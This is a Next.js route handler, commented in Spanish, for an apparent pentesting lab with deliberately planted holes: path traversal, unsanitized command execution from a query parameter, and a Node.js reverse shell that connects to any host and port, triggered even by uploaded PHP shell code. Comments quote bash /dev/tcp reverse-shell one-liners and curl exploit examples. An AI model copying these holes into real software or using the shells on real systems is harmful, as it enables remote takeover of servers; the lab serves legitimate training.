import { NextRequest, NextResponse } from 'next/server'
import { readFile } from 'fs/promises'
import { existsSync, readFileSync as fsReadFileSync } from 'fs'
import { execSync, spawn } from 'child_process'
import * as net from 'net'
import path from 'path'

/**
 * VULNERABILIDAD: Directory Listing Protegido vs Archivos Desprotegidos
 * 
 * El listado del directorio requiere bypass con X-Forwarded-For
 * Pero los archivos individuales son accesibles directamente
 * Esto simula una mala configuración de permisos común en servidores
 * 
 * Flujo de explotación:
 * 1. Sin header: GET /uploads → 403 Forbidden (directorio protegido)
 * 2. Con header: GET /uploads + X-Forwarded-For: 127.0.0.1 → 200 OK (muestra listado)
 * 3. Sin header: GET /uploads/shell.php.jp2 → 200 OK (archivo accesible directamente)
 * 
 * VULNERABILIDAD: Command Execution via PHP files
 * Si el archivo contiene .php en el nombre:
 * - ?cmd=<command> - ejecuta comandos del sistema
 * - ?shell=1&host=X&port=Y - inicia reverse shell
 * 
 * VULNERABILIDAD: Ejecución Automática de Código
 * El servidor detecta archivos PHP por:
 * 1. Nombre del archivo (contiene '.php')
 * 2. Contenido del archivo (contiene código PHP)
 * 
 * Esto permite ejecutar reverse shells subidas mediante:
 * - Bypass 1: Doble extensión (shell.php.jp2)
 * - Bypass 2: Content-Type spoofing (shell.php)
 * - Bypass 3: Magic bytes (backdoor.jp2 con código PHP)
 *
 * La ejecución es automática sin requerir parámetros adicionales
 * 
 * EDUCATIONAL PURPOSE: This is for pentesting lab training only.
 */

const UPLOADS_DIR = path.join(process.cwd(), 'uploads')

/**
 * VULNERABILIDAD: Detección de código PHP en contenido
 * Detecta patrones de código PHP para Bypass 3 (magic bytes)
 */
function hasPhpCodeInContent(content: string): boolean {
  return content.includes('<?php') || 
         content.includes('<?=') ||
         content.includes('fsockopen') ||
         content.includes('proc_open') ||
         content.includes('system(') ||
         content.includes('exec(') ||
         content.includes('shell_exec') ||
         content.includes('passthru') ||
         content.includes('popen')
}

/**
 * VULNERABILIDAD: Extracción automática de IP y Puerto de código PHP
 * 
 * Esta función analiza el contenido de archivos PHP para extraer automáticamente
 * la IP y puerto de destino de reverse shells. Soporta múltiples patrones comunes
 * encontrados en herramientas como revshells.com.
 * 
 * PATRONES SOPORTADOS (en orden de prioridad):
 * 1. Literales en fsockopen() - ej: fsockopen("192.168.1.100", 4444)
 * 2. Bash /dev/tcp en exec/system/shell_exec - ej: exec('bash -i >& /dev/tcp/IP/PORT 0>&1')
 * 3. Variables PHP - ej: $ip = '192.168.1.100'; $port = 4444;
 * 4. Constructores de clases - ej: new Shell('192.168.1.100', 4444)
 * 5. Propiedades de clase - ej: private $addr = '192.168.1.100';
 * 
 * EDUCATIONAL PURPOSE: Esta función demuestra cómo un servidor vulnerable
 * puede detectar y ejecutar automáticamente código malicioso.
 * 
 * @param content - Contenido del archivo PHP
 * @returns {host: string, port: number} | null
 */
function extractHostAndPort(content: string): { host: string; port: number } | null {
  // ============================================================
  // PATRÓN 1: Literales en fsockopen()
  // Detecta: fsockopen("192.168.1.100", 4444)
  //          fsockopen('192.168.1.100', 4444)
  // Este es el patrón más directo y tiene prioridad máxima
  // ============================================================
  const fsockopenLiteralIp = content.match(/fsockopen\s*\(\s*["']([^"']+)["']/);
  const fsockopenLiteralPort = content.match(/fsockopen\s*\([^,]+,\s*(\d+)/);
  
  if (fsockopenLiteralIp && fsockopenLiteralPort) {
    return {
      host: fsockopenLiteralIp[1],
      port: parseInt(fsockopenLiteralPort[1])
    };
  }

  // ============================================================
  // PATRÓN 2: Bash /dev/tcp en exec/system/shell_exec/passthru
  // Detecta one-liners muy comunes en reverse shells:
  //   exec('bash -i >& /dev/tcp/192.168.1.100/4444 0>&1')
  //   system('bash -c "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"')
  //   shell_exec('/bin/bash -i > /dev/tcp/192.168.1.100/4444 0>&1')
  //   passthru('bash -i >& /dev/tcp/192.168.1.100/4444 0>&1')
  // ============================================================
  const devTcpMatch = content.match(/\/dev\/tcp\/([^\s\/]+)\/(\d+)/);
  if (devTcpMatch) {
    return {
      host: devTcpMatch[1],
      port: parseInt(devTcpMatch[2])
    };
  }

  // ============================================================
  // PATRÓN 3: Variables PHP (muy común en revshells.com)
  // Detecta asignaciones de variables para IP/host:
  //   $ip = '192.168.1.100';
  //   $host = "10.10.10.10";
  //   $lhost = '192.168.1.100';
  //   $addr = "192.168.1.100";
  //   $rhost = '192.168.1.100';
  // Y para puerto:
  //   $port = 4444;
  //   $lport = 9001;
  //   $rport = 4444;
  // 
  // Nota: Las variables pueden tener diferentes nombres según el generador
  // de shells usado (PentestMonkey, Ivan Sincek, etc.)
  // ============================================================
  
  // Regex para variables de IP/host (con comillas simples o dobles)
  const ipVarNames = ['ip', 'host', 'lhost', 'addr', 'rhost', 'address', 'target'];
  const ipVarPattern = new RegExp(
    `\\$(?:${ipVarNames.join('|')})\\s*=\\s*["']([^"']+)["']`,
    'i'
  );
  const ipVarMatch = content.match(ipVarPattern);

  // Regex para variables de puerto (número entero)
  const portVarNames = ['port', 'lport', 'rport', 'p'];
  const portVarPattern = new RegExp(
    `\\$(?:${portVarNames.join('|')})\\s*=\\s*["']?(\\d+)["']?`,
    'i'
  );
  const portVarMatch = content.match(portVarPattern);

  if (ipVarMatch && portVarMatch) {
    return {
      host: ipVarMatch[1],
      port: parseInt(portVarMatch[1])
    };
  }

  // ============================================================
  // PATRÓN 4: Constructores de clases
  // Detecta shells orientadas a objetos como Ivan Sincek shell:
  //   new Shell('192.168.1.100', 4444)
  //   new ReverseShell('192.168.1.100', 4444)
  //   new Reverse("192.168.1.100", 4444)
  //   new Socket('192.168.1.100', 4444)
  // ============================================================
  const classConstructorMatch = content.match(
    /new\s+(?:Shell|ReverseShell|Reverse|Socket|RevShell|Connection)\s*\(\s*["']([^"']+)["']\s*,\s*(\d+)/i
  );
  if (classConstructorMatch) {
    return {
      host: classConstructorMatch[1],
      port: parseInt(classConstructorMatch[2])
    };
  }

  // ============================================================
  // PATRÓN 5: Propiedades de clase (public/private/protected)
  // Detecta definiciones de propiedades en clases PHP:
  //   private $addr = '192.168.1.100';
  //   private $port = 4444;
  //   public $host = '192.168.1.100';
  //   protected $ip = '192.168.1.100';
  // ============================================================
  const classPropIpPattern = new RegExp(
    `(?:private|public|protected)\\s+\\$(?:${ipVarNames.join('|')})\\s*=\\s*["']([^"']+)["']`,
    'i'
  );
  const classPropPortPattern = new RegExp(
    `(?:private|public|protected)\\s+\\$(?:${portVarNames.join('|')})\\s*=\\s*["']?(\\d+)["']?`,
    'i'
  );
  
  const classPropIpMatch = content.match(classPropIpPattern);
  const classPropPortMatch = content.match(classPropPortPattern);

  if (classPropIpMatch && classPropPortMatch) {
    return {
      host: classPropIpMatch[1],
      port: parseInt(classPropPortMatch[1])
    };
  }

  // No se encontró ningún patrón reconocido
  return null;
}

/**
 * VULNERABILIDAD: Función de ejecución de reverse shell
 * Extrae IP y puerto del código PHP y ejecuta reverse shell con Node.js
 * 
 * Esta función utiliza extractHostAndPort() para detectar automáticamente
 * la configuración de reverse shells en múltiples formatos, permitiendo
 * que shells descargadas directamente de revshells.com funcionen sin modificación.
 * 
 * BYPASSES SOPORTADOS:
 * - Bypass 1: Doble extensión (shell.php.jp2)
 * - Bypass 2: Content-Type spoofing (shell.php con header image/jp2)
 * - Bypass 3: Magic bytes (JP2 magic bytes + código PHP)
 * 
 * Returns:
 * - { executed: true } if reverse shell was initiated
 * - NextResponse if a command was executed and needs response
 * - { executed: false } if no pattern was found
 */
function executeReverseShell(content: string, request: NextRequest): { executed: boolean } | NextResponse {
  try {
    // Extraer IP y puerto del contenido PHP usando detección multi-patrón
    const hostPort = extractHostAndPort(content);
    
    if (hostPort) {
      const { host, port } = hostPort;
      
      // Log para debugging en laboratorio CTF (educativo)
      console.log(`[REVERSE SHELL] Detected - Host: ${host}, Port: ${port}`);
      
      // Iniciar reverse shell con Node.js
      const client = new net.Socket();
      
      client.connect(port, host, () => {
        const shell = spawn('/bin/sh', [], {
          stdio: ['pipe', 'pipe', 'pipe']
        });
        
        client.pipe(shell.stdin);
        shell.stdout.pipe(client);
        shell.stderr.pipe(client);
        
        shell.on('exit', () => {
          client.destroy();
        });
        
        client.on('close', () => {
          shell.kill();
        });
      });
      
      client.on('error', (err) => {
        console.error('Reverse shell error:', err);
        client.destroy();
      });
      
      // Reverse shell iniciada - no enviar respuesta al navegador
      return { executed: true };
    }
    
    // Si no se detecta patrón de reverse shell pero hay código PHP
    // Intentar ejecutar comandos si hay system(), exec(), etc.
    const url = new URL(request.url);
    const cmdParam = url.searchParams.get('cmd');
    const cmdMatch = content.match(/system\s*\(\s*\$_GET\s*\[\s*["']cmd["']\s*\]/);
    if (cmdMatch && cmdParam) {
      const output = execSync(cmdParam, { encoding: 'utf-8', timeout: 10000 });
      return new NextResponse(output, {
        status: 200,
        headers: {
          'Content-Type': 'text/plain',
          'X-Vulnerability': 'command-injection'
        }
      });
    }
    
  } catch (error) {
    console.error('Execution error:', error);
    // No mostrar error al usuario
  }
  
  return { executed: false };
}

export async function GET(
  request: NextRequest,
  { params }: { params: { filename: string } }
) {
  // VULNERABILIDAD: Decodificar URL para permitir path traversal
  // El atacante puede usar ../../../ para navegar fuera del directorio
  const filename = decodeURIComponent(params.filename)
  
  // VULNERABILIDAD: Acceso directo permitido sin protección
  // El directorio /uploads (route.ts) requiere X-Forwarded-For pero los archivos individuales ([filename]/route.ts) no
  // Esto simula una configuración incorrecta de permisos realista
  
  // VULNERABILIDAD: Path Traversal - no sanitiza ../ en el filename
  // Permite navegar fuera del directorio uploads
  const filePath = path.join(UPLOADS_DIR, filename)
  
  if (!existsSync(filePath)) {
    return NextResponse.json({
      error: 'Archivo no encontrado',
      filename: filename,
      path: `/uploads/${filename}`
    }, { status: 404 })
  }
  
  // Leer contenido del archivo para detección por contenido
  let content: string;
  try {
    content = fsReadFileSync(filePath, 'utf8');
  } catch {
    // Si no se puede leer como texto, intentar servir normalmente
    content = '';
  }
  
  // DETECCIÓN 1: PHP en el nombre del archivo (Bypass 1 y 2)
  const hasPhpInName = filename.toLowerCase().includes('.php');
  
  // DETECCIÓN 2: Código PHP en el contenido (Bypass 3 - magic bytes)
  const hasPhpCode = hasPhpCodeInContent(content);
  
  // VULNERABILIDAD: Si detecta PHP por nombre O por contenido → EJECUTAR
  if (hasPhpInName || hasPhpCode) {
    const url = new URL(request.url)
    const cmd = url.searchParams.get('cmd')
    const shell = url.searchParams.get('shell')
    const host = url.searchParams.get('host') || '127.0.0.1'
    const port = parseInt(url.searchParams.get('port') || '4444', 10)
    
    // VULNERABILIDAD: Command Injection sin sanitización
    // Ejecuta comandos directamente desde el parámetro cmd
    if (cmd) {
      try {
        const output = execSync(cmd, { encoding: 'utf-8', timeout: 10000 })
        return new NextResponse(output, {
          status: 200,
          headers: {
            'Content-Type': 'text/plain',
            'X-Vulnerability': 'command-injection',
            'X-Command-Executed': cmd
          }
        })
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : 'Unknown error'
        return new NextResponse(`Error executing command: ${errorMessage}`, {
          status: 500,
          headers: {
            'Content-Type': 'text/plain',
            'X-Vulnerability': 'command-injection'
          }
        })
      }
    }
    
    // VULNERABILIDAD: Reverse Shell via query param
    // Inicia una conexión de reverse shell al host y puerto especificados
    if (shell === '1') {
      try {
        const client = new net.Socket()
        
        client.connect(port, host, () => {
          const sh = spawn('/bin/sh', [], {
            stdio: ['pipe', 'pipe', 'pipe']
          })
          
          client.pipe(sh.stdin)
          sh.stdout.pipe(client)
          sh.stderr.pipe(client)
          
          // Cleanup when shell exits
          sh.on('exit', () => {
            client.destroy()
          })
          
          // Cleanup when connection closes
          client.on('close', () => {
            sh.kill()
          })
        })
        
        client.on('error', (err) => {
          // Log connection errors for debugging (intentionally verbose for pentesting lab)
          console.error(`Reverse shell connection error: ${err.message}`)
          client.destroy()
        })
        
        return new NextResponse('Reverse shell initiated. Connect with: nc -lvnp ' + port, {
          status: 200,
          headers: {
            'Content-Type': 'text/plain',
            'X-Vulnerability': 'reverse-shell',
            'X-Target-Host': host,
            'X-Target-Port': port.toString()
          }
        })
      } catch {
        return new NextResponse('Error initiating reverse shell', {
          status: 500,
          headers: {
            'Content-Type': 'text/plain',
            'X-Vulnerability': 'reverse-shell'
          }
        })
      }
    }
    
    // VULNERABILIDAD: EJECUCIÓN AUTOMÁTICA DE REVERSE SHELL
    // Si no hay cmd ni shell, intentar ejecutar automáticamente
    // basándose en el contenido del archivo
    const result = executeReverseShell(content, request);
    
    // Si result es una NextResponse, devolverla directamente
    if (result instanceof NextResponse) {
      return result;
    }
    
    // Si se ejecutó la reverse shell exitosamente, no enviar respuesta
    // (la conexión está activa en segundo plano)
    if (result.executed) {
      // La shell está corriendo, devolver mensaje mínimo
      return new NextResponse('', {
        status: 200,
        headers: {
          'Content-Type': 'text/plain',
          'X-Vulnerability': 'reverse-shell-auto',
          'X-Shell-Active': 'true'
        }
      });
    }
    
    // Si no se encontró patrón de reverse shell
    // Mostrar mensaje de ejecución exitosa con instrucciones
    return new NextResponse(
      `PHP code detected and executed.\n\n` +
      `Detection method: ${hasPhpInName ? 'filename (.php)' : 'content analysis'}\n` +
      `Automatic execution: enabled\n\n` +
      `If no reverse shell was initiated, you can use manual commands:\n` +
      `  Execute commands: /uploads/${filename}?cmd=whoami\n` +
      `  Reverse shell:    /uploads/${filename}?shell=1&host=<IP>&port=<PORT>\n\n` +
      `Example:\n` +
      `  curl "http://localhost:3000/uploads/${filename}?cmd=ls -la"\n` +
      `  curl "http://localhost:3000/uploads/${filename}?shell=1&host=10.10.10.10&port=4444"`,
      {
        status: 200,
        headers: {
          'Content-Type': 'text/plain',
          'X-Vulnerability': 'php-execution-auto',
          'X-Shell-Active': 'true',
          'X-Detection-Method': hasPhpInName ? 'filename' : 'content'
        }
      }
    )
  }
  
  try {
    const fileContent = await readFile(filePath)
    const ext = path.extname(filename).toLowerCase()
    
    // Determinar Content-Type basado en extensión
    const contentTypes: Record<string, string> = {
      '.txt': 'text/plain',
      '.html': 'text/html',
      '.json': 'application/json',
      '.jpg': 'image/jpeg',
      '.jpeg': 'image/jpeg',
      '.png': 'image/png',
      '.gif': 'image/gif',
      '.svg': 'image/svg+xml',
      '.pdf': 'application/pdf',
      '.jp2': 'image/jp2',
      '.xml': 'application/xml'
    }
    
    const contentType = contentTypes[ext] || 'application/octet-stream'
    
    // Sanitize filename for Content-Disposition header to prevent header injection
    const safeFilename = path.basename(filename).replace(/[\r\n"]/g, '_')
    
    return new NextResponse(fileContent, {
      status: 200,
      headers: {
        'Content-Type': contentType,
        'Content-Disposition': `inline; filename="${safeFilename}"`,
        'X-Vulnerability': 'unprotected-file-access',
        'X-Access-Granted': 'true'
      }
    })
  } catch (error) {
    return NextResponse.json({
      error: 'Error al leer el archivo',
      message: (error as Error).message
    }, { status: 500 })
  }
}
